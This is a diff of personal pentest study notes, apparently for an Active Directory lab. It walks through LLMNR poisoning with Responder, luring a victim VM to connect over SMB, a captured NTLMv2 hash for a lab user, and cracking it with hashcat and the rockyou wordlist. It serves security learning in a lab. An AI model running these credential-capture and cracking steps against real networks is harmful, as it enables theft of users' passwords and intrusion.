@@ -2530,9 +2530,50 @@ On one of client
 
 > [!todo] 
 >  In Kali run `sudo responder -I eth0 -rdwv`
->  for me parameter `-rdwv` gave error. So I just run it without.
+>  for me parameter `-rdwv` gave error. 
+> I try it with following command `sudo responder -I eth0 -Pv`
 
-![[Pasted image 20230219130008.png]]
+![[Pasted image 20230219150535.png]]
+
+> [!todo] 
+> On victim VM, try smb to Kali VM IP
+> `\\x.x.x.x`
+
+
+![[Pasted image 20230219150616.png]] 
+
+![[Pasted image 20230219150701.png]]
+
+### Password Cracking with Hashcat
+
+> [!todo] 
+> Take hash:
+> ``` 
+fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000803D30EA7644D9011CF5B5FE62CB368F00000000020008004500470037004C0001001E00570049004E002D005600500035004100360031005000500030004500410004003400570049004E002D00560050003500410036003100500050003000450041002E004500470037004C002E004C004F00430041004C00030014004500470037004C002E004C004F00430041004C00050014004500470037004C002E004C004F00430041004C0007000800803D30EA7644D9010600040002000000080030003000000000000000010000000020000060371BB1529D9A70E5181D74CA4682474F4BCAF428F7BB2E0BD38B3A69F4453D0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200300033002E003100320038000000000000000000
+
+> [!todo] 
+>  See all types of supported hashes in hashcat:
+>  `hashcat --help`
+
+![[Pasted image 20230219153320.png]]
+
+![[Pasted image 20230219153445.png]]
+
+> [!todo] 
+> Crack hash we catched (if you run it in VM you have to add `--force` parram):
+> `hashcat -m 5600 Desktop/ntlmv2_hash.txt rockyou.txt --force` 
+
+> [!attention] 
+> You normally should run it on host system itself and not VM to have GPU support and faster cracking !!
+> Here link to binary for different plattforms:
+> https://hashcat.net/hashcat/
+
+> [!info] 
+> On Windows:
+> `hashcat -m 5600 ntlmv2_hash.txt rockyou.txt  -O` 
+
+![[Pasted image 20230219155148.png]]
+
 
 
 
